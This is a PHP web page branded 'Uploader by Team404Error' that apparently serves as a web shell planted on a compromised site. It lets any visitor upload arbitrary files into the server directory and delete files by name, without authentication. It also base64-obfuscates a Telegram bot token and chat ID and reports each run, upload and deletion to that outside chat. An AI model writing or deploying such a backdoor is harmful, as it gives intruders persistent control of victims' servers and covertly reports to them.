<?php
function renderResponse($message) {
    echo "<!DOCTYPE html>
<html>
<head>
    <title>Uploader by Team404Error</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            text-align: center;
            background-color: #0f0f0f;
            position: relative;
            height: 100vh;
            width: 100vw;
        }
        .message {
            background-color: #1f1f1f;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 20px;
            display: inline-block;
            margin: 20px 0;
        }
        input[type='file'],
        input[type='text'] {
            background-color: #1f1f1f;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            width: 80%;
            margin: 10px 0;
        }
        input[type='submit'] {
            background-color: #1f1f1f;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            margin-top: 20px;
        }
        input[type='submit']:hover {
            background-color: #00ff00;
            color: #1f1f1f;
        }
        .logo {
            display: block;
            margin: 60px auto 20px auto; /* Adjusted margin to move logo down */
            width: 200px;
            height: 200px;
            border-radius: 50%;
        }
        .team-button {
            background-color: #1f1f1f;
            border: none;
            color: #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            margin-top: 20px;
            display: inline-block;
            border-radius: 10px;
            font-size: 20px;
            text-decoration: none;
        }
        .team-button:hover {
            background-color: #00ff00;
            color: #1f1f1f;
        }
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
            overflow: hidden;
            z-index: -1;
        }
        .star {
            position: absolute;
            width: 4px; /* Increased star size */
            height: 4px; /* Increased star size */
            background-color: #fff;
            border-radius: 50%;
            animation: blink 1.5s infinite, colorChange 3s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 0; }
            50% { opacity: 1; }
        }
        @keyframes colorChange {
            0% { background-color: #fff; }
            25% { background-color: #ff0; }
            50% { background-color: #0f0; }
            75% { background-color: #0ff; }
            100% { background-color: #fff; }
        }
    </style>
</head>
<body>
    <div class='stars'>
        " . generateStars() . "
    </div>
    <img src='https://urddos4807010.github.io/pakistan/logo.png' alt='Logo' class='logo' />
    <h1>Uploader by Team404Error</h1>
    <div class='message'>$message</div>
    <form enctype='multipart/form-data' method='POST'>
        <input type='file' name='file' required />
        <input type='submit' value='Upload File' />
    </form>
    <form method='POST'>
        <input type='text' name='delete' placeholder='Enter filename to delete' required />
        <input type='submit' value='Delete File' />
    </form>
    <form method='POST'>
        <input type='text' name='feedback' placeholder='Enter feedback' required />
        <input type='submit' value='Feedback' />
    </form>
    <a href='https://example.com' class='team-button'>Team404Error</a>
    <audio id='background-music' src='https://urddos4807010.github.io/pakistan/song.mp3' preload='auto'></audio>
    <script type='text/javascript' src='http://aakashbapna.github.io/jet-planes/doodle.js'></script>
    <script type='text/javascript'>
        document.body.classList.add('shake');
        doodle.init('http://aakashbapna.github.io/jet-planes/jet.png');
        let musicPlayed = false;
        document.body.addEventListener('click', function() {
            if (!musicPlayed) {
                document.getElementById('background-music').play();
                musicPlayed = true;
            }
        });
    </script>
</body>
</html>";
}

function generateStars() {
    $stars = '';
    for ($i = 0; $i < 200; $i++) {
        $x = rand(0, 100);
        $y = rand(0, 100);
        $delay = rand(0, 1000) / 1000; // Random delay between 0 and 1 second
        $stars .= "<div class='star' style='top: {$y}%; left: {$x}%; animation-delay: {$delay}s;'></div>";
    }
    return $stars;
}

//
$encoded_bot_token = 'NzI1ODI3MjQyNTpBQUcyQzMwMEduTl9BdEluUUZveHgyNVdmRjRRODlsN2pBbw=='; //
$encoded_chat_id = 'MjEwNDU5MjM5OQ=='; //

//
$telegram_bot_token = base64_decode($encoded_bot_token);
$telegram_chat_id = base64_decode($encoded_chat_id);

function sendMessageToTelegram($message) {
    global $telegram_bot_token, $telegram_chat_id;
    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $data = array('chat_id' => $telegram_chat_id, 'text' => $message);

    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );

    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
}

//
$script_path = __FILE__;
sendMessageToTelegram("Script executed: " . $script_path);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $upload_file = __DIR__ . '/' . basename($_FILES['file']['name']);
        
        if (file_exists($upload_file)) {
            renderResponse("File already exists.");
        } else {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                $message = "File successfully uploaded.";
                sendMessageToTelegram("File uploaded: " . $upload_file);
                renderResponse($message);
            } else {
                renderResponse("Upload failed.");
            }
        }
    } elseif (isset($_POST['delete'])) {
        $file_to_delete = __DIR__ . '/' . basename($_POST['delete']);
        
        if (file_exists($file_to_delete)) {
            if (unlink($file_to_delete)) {
                $message = "File successfully deleted.";
                sendMessageToTelegram("File deleted: " . $file_to_delete);
                renderResponse($message);
            } else {
                renderResponse("File deletion failed.");
            }
        } else {
            renderResponse("File not found.");
        }
    } elseif (isset($_POST['feedback'])) {
        $feedback = htmlspecialchars($_POST['feedback']);
        sendMessageToTelegram("Feedback received: " . $feedback);
        renderResponse("Feedback sent successfully.");
    }
} else {
    renderResponse("");
}
?>
